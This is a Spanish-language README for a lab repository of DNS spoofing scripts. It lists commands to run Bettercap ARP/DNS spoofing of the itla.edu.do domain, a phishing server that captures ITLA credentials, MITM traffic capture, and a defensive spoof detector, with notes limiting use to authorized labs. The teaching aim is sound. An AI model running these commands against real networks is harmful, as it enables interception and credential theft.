# Scripts: DNS Spoofing / DNS Poisoning

## 📁 Descripción

Esta carpeta contiene scripts y herramientas para ejecutar ataques DNS (ARP Spoofing + DNS Spoofing) de forma automatizada.

## 📋 Archivos Disponibles

### 1. `bettercap_dns_spoof.cap`
**Tipo**: Bettercap Configuration
**Propósito**: Configuración lista para DNS Spoofing
**Función**: ARP Spoofing + DNS Spoofing del dominio itla.edu.do

```bash
sudo bettercap -iface eth0 -cap bettercap_dns_spoof.cap
```

---

### 2. `dns_spoof_monitor.sh`
**Tipo**: Bash Script
**Propósito**: Monitorear DNS queries en tiempo real
**Función**: Capturar y mostrar resoluciones de DNS siendo suplantadas

```bash
bash dns_spoof_monitor.sh -i eth0 -d itla.edu.do
```

---

### 3. `arp_spoof.py`
**Tipo**: Python Script
**Propósito**: ARP Spoofing manual con Scapy
**Función**: Posicionarse como MITM antes de DNS spoofing

```python
python3 arp_spoof.py --gateway 192.168.1.1 --targets 192.168.1.50-254
```

---

### 4. `dns_spoof.py`
**Tipo**: Python Script
**Propósito**: DNS Spoofing manual con Scapy
**Función**: Inyectar respuestas DNS falsas

```python
python3 dns_spoof.py --domain itla.edu.do --ip 192.168.1.100
```

---

### 5. `fake_web_server.py`
**Tipo**: Python Script
**Propósito**: Servidor web malicioso (phishing)
**Función**: Simular sitio de ITLA para capturar credenciales

```python
python3 fake_web_server.py --port 80 --template itla_phishing.html
```

---

### 6. `dns_detector.py`
**Tipo**: Python Script
**Propósito**: Detectar intentos de DNS spoofing
**Función**: Monitorear inconsistencias en respuestas DNS

```python
python3 dns_detector.py --domains itla.edu.do,google.com --alert-email admin@itla.edu.do
```

---

### 7. `mitm_traffic_capture.sh`
**Tipo**: Bash Script
**Propósito**: Capturar tráfico MITM con tcpdump
**Función**: Registrar credenciales y datos enviados después del spoofing

```bash
bash mitm_traffic_capture.sh -i eth0 -o capture.pcap
```

---

## 🚀 Instalación

```bash
# Clonar scripts
git clone https://github.com/FAVA-007/DNS-Spoofing-DNS-Poisoning.git
cd DNS-Spoofing-DNS-Poisoning/scripts

# Hacer ejecutables
chmod +x *.sh

# Instalar dependencias
sudo apt install bettercap
pip install scapy

# Ejecutar Bettercap
sudo bettercap -iface eth0 -cap bettercap_dns_spoof.cap
```

---

## ⚠️ Notas de Seguridad

- **Solo en laboratorios**: Red aislada y controlada
- **Autorización requerida**: Permiso escrito de propietario de red
- **Responsabilidad alta**: Cadena de custodia de datos capturados

---

## 📚 Referencias

- Bettercap GitHub: https://github.com/bettercap/bettercap
- Scapy Documentation: https://scapy.readthedocs.io/
- RFC 1035: DNS Specification
- RFC 5246: TLS Protocol

---

**Última actualización**: Febrero 2026
